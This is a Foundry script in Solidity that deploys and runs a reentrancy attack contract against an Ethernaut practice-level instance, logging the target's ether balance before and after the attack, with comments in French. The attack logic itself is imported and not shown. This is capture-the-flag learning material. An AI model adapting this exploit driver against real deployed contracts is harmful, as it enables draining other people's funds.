// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Script.sol";
import "../src/ReentranceAttack.sol"; // 1) add file

contract ReentranceName is Script { // 2) change contractName

    function run() external {

        address target = 0xafAC8a4Dee114B8F823ce384eE404419cE9404f5; // 3) add ethernaut instance address
        uint256 privateKey = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(privateKey);

        ReentranceAttack attacker = new ReentranceAttack(target);

        console.log("Balance du contrat avant attaque: ", target.balance);

        attacker.attack{value: 0.001 ether}();

        console.log("Balance du contrat apres attaque: ", target.balance);

        vm.stopBroadcast();

    }
}